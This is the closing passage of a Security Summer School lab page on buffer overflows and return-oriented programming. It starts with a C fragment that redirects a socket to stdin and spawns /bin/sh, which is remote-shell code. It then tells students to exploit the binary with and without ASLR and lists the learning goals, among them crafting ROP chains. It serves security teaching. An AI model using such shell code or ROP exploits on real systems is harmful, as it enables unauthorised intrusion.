</span></span><span style=display:flex><span><span style=color:#000>dup2</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>sockfd</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span><span style=color:#000>system</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;/bin/sh&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span></code></pre></div><p>Exploit it first with ASLR disabled and then with it enabled.</p><h2 id=conclusions>Conclusions</h2><p>At the end of this session, you should:</p><ul><li>Understand the limitations of classic buffer overflow attacks, as well as
shellcodes.</li><li>Understand and visualise the effect of various simple ROP attacks on a
program&rsquo;s stack</li><li>Be able to craft and make use of ROP chains in order to hack vulnerable
binaries</li></ul><style>.feedback--answer{display:inline-block}.feedback--answer-no{margin-left:1em}.feedback--response{display:none;margin-top:1em}.feedback--response__visible{display:block}</style><div class=d-print-none><h2 class=feedback--title>Feedback</h2><p class=feedback--question>Was this page helpful?</p><button class="btn btn-primary mb-4 feedback--answer feedback--answer-yes">Yes</button>
<button class="btn btn-primary mb-4 feedback--answer feedback--answer-no">No</button><p class="feedback--response feedback--response-yes">Glad to hear it! Please <a href=https://github.com/security-summer-school/security-summer-school.github.io/issues/new>tell us how we can improve</a>.</p><p class="feedback--response feedback--response-no">Sorry to hear that. Please <a href=https://github.com/security-summer-school/security-summer-school.github.io/issues/new>tell us how we can improve</a>.</p></div><script>const yesButton=document.querySelector(".feedback--answer-yes"),noButton=document.querySelector(".feedback--answer-no"),yesResponse=document.querySelector(".feedback--response-yes"),noResponse=document.querySelector(".feedback--response-no"),disableButtons=()=>{yesButton.disabled=!0,noButton.disabled=!0},sendFeedback=e=>{if(typeof ga!="function")return;const t={command:"send",hitType:"event",category:"Helpful",action:"click",label:window.location.pathname,value:e};ga(t.command,t.hitType,t.category,t.action,t.label,t.value)};yesButton.addEventListener("click",()=>{yesResponse.classList.add("feedback--response__visible"),disableButtons(),sendFeedback(1)}),noButton.addEventListener("click",()=>{noResponse.classList.add("feedback--response__visible"),disableButtons(),sendFeedback(0)})</script><br></div></main></div></div><footer class="bg-dark py-5 row d-print-none"><div class="container-fluid mx-sm-5"><div class=row><div class="col-6 col-sm-4 text-xs-center order-sm-2"><ul class="list-inline mb-0"><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Discord aria-label=Discord><a class=text-white target=_blank rel=noopener href=https://bit.ly/DiscordSecuritySummerSchool aria-label=Discord><i class="fab fa-discord"></i></a></li><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Facebook aria-label=Facebook><a class=text-white target=_blank rel=noopener href=https://www.facebook.com/SSSUPB/ aria-label=Facebook><i class="fab fa-facebook"></i></a></li><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Youtube aria-label=Youtube><a class=text-white target=_blank rel=noopener href=https://bit.ly/YoutubeSecuritySummerSchool aria-label=Youtube><i class="fab fa-youtube"></i></a></li></ul></div><div class="col-6 col-sm-4 text-right text-xs-center order-sm-3"><ul class="list-inline mb-0"><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=GitHub aria-label=GitHub><a class=text-white target=_blank rel=noopener href=https://github.com/security-summer-school aria-label=GitHub><i class="fab fa-github"></i></a></li></ul></div><div class="col-12 col-sm-4 text-center py-2 order-sm-2"><small class=text-white>&copy; 2024 Open-Source Contributors. All Rights Reserved</small></div></div></div></footer></div><script src=https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js integrity=sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.min.js integrity="sha512-UR25UO94eTnCVwjbXozyeVd6ZqpaAE9naiEUBK/A+QDbfSTQFhPGj5lOR6d8tsgbBk84Ggb5A3EkjsOgPRPcKA==" crossorigin=anonymous></script>
<script src=/js/tabpane-persist.js></script>
<script src=/js/main.min.aa9f4c5dae6a98b2c46277f4c56f1673a2b000d1756ce4ffae93784cab25e6d5.js integrity="sha256-qp9MXa5qmLLEYnf0xW8Wc6KwANF1bOT/rpN4TKsl5tU=" crossorigin=anonymous></script></body></html>